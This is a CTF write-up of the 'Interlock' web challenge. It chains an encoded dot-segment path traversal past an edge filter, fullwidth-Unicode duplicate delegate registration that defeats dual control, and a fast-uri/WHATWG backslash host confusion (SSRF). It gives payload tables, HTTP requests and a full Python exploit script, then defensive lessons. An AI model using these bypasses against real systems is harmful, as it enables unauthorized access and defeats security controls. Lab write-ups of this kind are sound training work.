# CSCTF 2026 — Interlock Writeup

**08/11/2026**

---

> **CTF:** CSCTF 2026  
> **Challenge:** Interlock  
> **Category:** Web  
> **Author:** Mohamed Amine Mzoughi  
> **Team:** XREFctf  
> **Writeup Author:** Mahmoud Adel  
{: .prompt-info }

## Introduction

Hey everyone! My name is **Mahmoud Adel** — a cybersecurity enthusiast passionate about red teaming and CTFs. Today I'm walking through how I solved the **Interlock** web challenge from **CSCTF 2026**.

The challenge presented a read-only "reliability console" for the Velmara National Transmission Authority. A forged protection setting-group had been loaded into the Keld Ridge substation cluster, and a compromised engineer account had also added the cluster to the dispatcher's quarantine list. The goal was to issue and dispatch an isolation order to the substation gateway (`sg-kr.grid.test`) so it would return an isolation receipt containing the flag.

The console was a small HTML/JS dashboard that pulled its data from a few public-looking endpoints and exposed an operations API at `/api/v1/schema`. The schema disclosed the policy rules, the engineer roster, and the dispatch interface — including the fact that target validation was performed with `fast-uri 3.1.2`, and that the edge policy *"authorizes on the request path as received."*

The challenge brief also included a very pointed hint: use a client that sends the path exactly as typed (e.g. `curl --path-as-is`). That signaled early on that the solution depended on how the path was interpreted across two parsing stages.

Let's get right into it!

---

## Initial Reconnaissance

The console served a single page whose client-side JavaScript queried three endpoints:

- `GET /api/v1/schema`
- `GET /reference/roster`
- `GET /audit/ledger`

Pulling the schema provided the structural architecture of the application:

```json
{
  "edge": { "policy": "authorizes on the request path as received" },
  "cluster": {
    "substation": "KELD RIDGE",
    "buses": ["KR-B1", "KR-B2"],
    "gateway": "sg-kr.grid.test"
  },
  "dual_control": {
    "requester": "roster",
    "approver": "roster",
    "distinct": true
  },
  "delegates": { "uniqueness": "casefold" },
  "operations": {
    "endpoints": [
      { "method": "POST", "path": "/ops/delegates" },
      { "method": "POST", "path": "/ops/orders" },
      { "method": "POST", "path": "/ops/orders/approve" },
      { "method": "POST", "path": "/ops/dispatch" }
    ]
  },
  "dispatch": {
    "target_validation": { "parser": "fast-uri", "version": "3.1.2" },
    "release_unlock": {
      "algorithm": "sha256-hex",
      "input": "interlock|<order_id>|<bus identifiers joined by comma>",
      "member": "unlock"
    }
  }
}
```

The roster endpoint returned:

```json
{
  "matching": "NFKC+casefold",
  "engineers": ["k.vostra", "r.mendal", "a.torvo"]
}
```

The audit ledger showed the quarantine event:

```json
{
  "at": "02:48Z",
  "actor": "k.vostra",
  "action": "quarantine.add",
  "host": "sg-kr.grid.test"
}
```

Three observations stood out immediately:

1. **Edge path policy:** The edge policy explicitly authorized *on the request path as received*, rather than on a decoded or canonicalized URI.
2. **Normalization asymmetry:** Roster matching used **NFKC + casefold**, whereas delegate uniqueness used **only casefold**. This meant fullwidth or mathematical Unicode characters could produce distinct delegate records while normalizing to valid roster identities.
3. **URL parser discrepancy:** Target validation relied on **`fast-uri 3.1.2`**, which handles backslashes in the authority component differently from Node's WHATWG URL parser.

---

## Investigation and Exploitation

### Step 1 — Finding a path the edge would let through

Direct requests to `/ops/delegates` returned:

```text
status=403
body: {"error":"policy.path_restricted"}
```

The reverse proxy / edge was enforcing a prefix check on the raw, incoming path. Because `/api/v1/schema` was whitelisted, the goal was to construct a path that began with `/api/v1/schema` at the edge, yet resolved to `/ops/delegates` at the backend router.

I tested several traversal encodings using Python's `http.client` (which transmits URI paths byte-for-byte without client-side normalization):

| Path sent | Result | Analysis |
|---|---|---|
| `/api/v1/schema/..%2f..%2f..%2fops/delegates` | `404` | Encoded slashes (`%2f`) not decoded by router |
| `/api/v1/schema/..%2F..%2F..%2Fops/delegates` | `404` | Uppercase `%2F` not decoded |
| `/api/v1/schema/..%2f..%2f..%2f..%2fops/delegates` | `404` | Over-traversal with encoded slashes |
| `/api/v1/schema/%2e%2e%2f%2e%2e%2f%2e%2e%2fops/delegates` | `404` | Encoded dots and encoded slashes |
| `/api/v1/schema/%2e%2e/%2e%2e/%2e%2e/ops/delegates` | **`409 {"error":"principal.exists"}`** | **Bypass confirmed!** Decodes to `/ops/delegates` |
| `/api/v1/schema/../../ops/delegates` | `404 {"path":"/api/ops/delegates"}` | Insufficient traversal depth |
| `/ops/delegates` | `403 {"error":"policy.path_restricted"}` | Blocked directly by edge |

The differential was clear:
- When the slash was encoded (`%2f`), the backend router did not decode it, looking for a literal route containing `%2f`.
- When the slash was literal (`/`) and only the dots were encoded (`%2e%2e`), the backend decoded `%2e%2e` to `..`, normalized `/api/v1/schema/../../../ops/delegates` down to `/ops/delegates`, and routed the request to the real handler.

The working bypass path was:

```text
/api/v1/schema/%2e%2e/%2e%2e/%2e%2e/ops/delegates
```

### Step 2 — Getting two distinct, valid delegate tokens

With `/ops/delegates` accessible, registering `r.mendal` directly returned `409 {"error":"principal.exists"}`.

However, the normalization discrepancy provided the bypass:
- **Roster check:** uses `NFKC + casefold`.
- **Delegate uniqueness:** uses `casefold` only.

A fullwidth string such as `ｒ．ｍｅｎｄａｌ` (Unicode `\uFF52\uFF0E\uFF4D\uFF45\uFF4E\uFF44\uFF41\uFF4C`):
- NFKC-normalizes to ASCII `r.mendal`, matching the authorized engineer roster.
- Casefolds to itself (fullwidth characters do not fold to ASCII under standard casefolding), passing the uniqueness check as a new principal.

Issuing registration requests for fullwidth variants yielded valid delegate tokens:

```http
POST /api/v1/schema/%2e%2e/%2e%2e/%2e%2e/ops/delegates HTTP/1.1
Content-Type: application/json

{"name": "ｒ．ｍｅｎｄａｌ"}
```

Response:

```json
{"token": "tok-1", "name": "ｒ．ｍｅｎｄａｌ"}
```

Repeating for `ａ．ｔｏｒｖｏ`:

```json
{"token": "tok-2", "name": "ａ．ｔｏｒｖｏ"}
```

This produced two delegate tokens representing `r.mendal` and `a.torvo`, fulfilling the dual-control requirement.

### Step 3 — Creating and approving the isolation order

Using the bypassed path and the two tokens, creating and approving the order proceeded normally:

```http
POST /api/v1/schema/%2e%2e/%2e%2e/%2e%2e/ops/orders HTTP/1.1
Content-Type: application/json

{"bus": ["KR-B1", "KR-B2"], "requester_token": "<tok-1>"}
```

Response: `{"order_id": "<order_id>", "status": "pending"}`

Approving with the second token:

```http
POST /api/v1/schema/%2e%2e/%2e%2e/%2e%2e/ops/orders/approve HTTP/1.1
Content-Type: application/json

{"order_id": "<order_id>", "approver_token": "<tok-2>"}
```

Response: `{"order_id": "<order_id>", "status": "approved"}`

The order was now fully approved under dual control.

### Step 4 — Computing the release unlock

The schema defined the unlock digest formula:

```text
input: "interlock|<order_id>|<bus identifiers joined by comma>"
algorithm: sha256-hex
```

For buses `KR-B1,KR-B2`:

```python
import hashlib
unlock = hashlib.sha256(f"interlock|{order_id}|KR-B1,KR-B2".encode()).hexdigest()
```

### Step 5 — Reaching the quarantined gateway via fast-uri / WHATWG host confusion

The dispatcher validated the `target` parameter using `fast-uri 3.1.2`, but the actual outbound HTTP request was executed by Node's native HTTP stack using WHATWG URL parsing.

For an authority with a backslash:

```text
http://sg-kr.grid.test\@example.com/
```

- **`fast-uri 3.1.2`:** Parses the authority up to `/` and treats `\` as a literal character inside userinfo. It extracts `example.com` as the hostname, passing the quarantine check.
- **Node WHATWG URL parser:** Normalizes `\` to `/` in special URLs, collapsing the target to `http://sg-kr.grid.test/@example.com/` where the host is `sg-kr.grid.test`. The socket connects directly to the quarantined gateway!

### Full Exploit Script

```python
#!/usr/bin/env python3
import http.client, json, hashlib, itertools

HOST, PORT = "<INSTANCE_HOST>", 35771
OPS = "/api/v1/schema/%2e%2e/%2e%2e/%2e%2e/ops"

def post(path, body):
    c = http.client.HTTPConnection(HOST, PORT, timeout=30)
    c.request("POST", path, body=json.dumps(body).encode(), headers={
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Host": HOST,
    })
    r = c.getresponse()
    raw = r.read().decode(errors="replace")
    c.close()
    return r.status, raw

def letter_variants(c):
    v = [c]
    if 'a' <= c <= 'z':
        v += [chr(ord(c) + 0xFEE0)]               # fullwidth
    elif 'A' <= c <= 'Z':
        v += [chr(ord(c) + 0xFEE0)]
    elif c == '.':
        v += ['\uFF0E', '\uFE52', '\u2024']
    return v

def variants(name):
    seen = set()
    for combo in itertools.product(*(letter_variants(c) for c in name)):
        s = ''.join(combo)
        if s not in seen:
            seen.add(s)
            yield s

def make_delegate(name):
    for cand in variants(name):
        st, b = post(OPS + "/delegates", {"name": cand})
        if st in (200, 201):
            return json.loads(b)["token"]
    return None

req_tok = make_delegate("r.mendal")
app_tok = make_delegate("a.torvo")

oid = None
for bus in (["KR-B1", "KR-B2"], "KR-B1,KR-B2"):
    st, b = post(OPS + "/orders", {"bus": bus, "requester_token": req_tok})
    if st in (200, 201):
        oid = json.loads(b)["order_id"]
        break

post(OPS + "/orders/approve", {"order_id": oid, "approver_token": app_tok})

unlock = hashlib.sha256(f"interlock|{oid}|KR-B1,KR-B2".encode()).hexdigest()

st, b = post(OPS + "/dispatch", {
    "order_id": oid,
    "target": "http://sg-kr.grid.test\\@example.com/",
    "unlock": unlock,
})
print("Dispatch result:", st, b)
```

---

## Root Cause & Technical Explanation

The exploit chained three independent parsing differentials across application boundaries:

1. **Raw path authorization vs normalized routing:** The edge evaluated path permissions against the raw request line (`/api/v1/schema` prefix), while the backend application performed percent-decoding and dot-segment normalization (`%2e%2e/` -> `../`), collapsing the route to `/ops/*`.
2. **Unicode normalization discrepancy:** Roster lookup utilized `NFKC + casefold`, while the uniqueness constraint checked only `casefold`. Fullwidth Unicode characters allowed the same underlying identity to register duplicate principals with separate tokens.
3. **URL parser differential (`fast-uri` vs WHATWG):** In `fast-uri 3.1.2`, a backslash in the authority is treated as userinfo data, pointing the host to `example.com`. In Node's WHATWG URL parser, the backslash is normalized to a forward slash, directing the HTTP socket to `sg-kr.grid.test`.

---

## Final Result & Flag

Executing the dispatch with the fast-uri/WHATWG backslash payload and valid unlock hash triggered the isolation order on `sg-kr.grid.test`, returning the isolation receipt and the flag:

```text
CSCTF{<REDACTED>}
```

The full chain completed successfully. *(Note: The live flag string has been redacted per competition rules).*

---

## Conclusion & Key Takeaways

1. **Path authorization must operate on canonicalized paths:** Evaluating unnormalized request paths while backend routers decode and collapse dot segments is a primary cause of proxy-bypass vulnerabilities.
2. **Canonicalize inputs consistently across stores:** If authorization logic performs NFKC normalization, all uniqueness and collision checks must evaluate the same canonical representation.
3. **Avoid multi-parser URL validation:** Never use one URL parser library (such as `fast-uri`) to validate requests that will be executed by another (such as Node `http` / WHATWG), as divergence in authority and delimiter handling can completely undermine SSRF and quarantine filters.

---

## AI Methodology

During this challenge, I used an AI assistant for:

- Discussing the `fast-uri 3.1.2` authority parser differential regarding backslash handling.
- Generating Unicode fullwidth candidate permutations for testing NFKC normalization against the engineer roster.
- Structuring the Python automation script utilizing `http.client` for raw URI dispatch.

All requests were executed against the live challenge instance from my workstation, and the path traversal behavior, delegate tokens, and isolation receipts were verified directly.

*No live flags, credentials, tokens, or instance URLs are included in this writeup.*

---

*Thanks for reading — hope this writeup helped someone learn something new. Happy hacking!*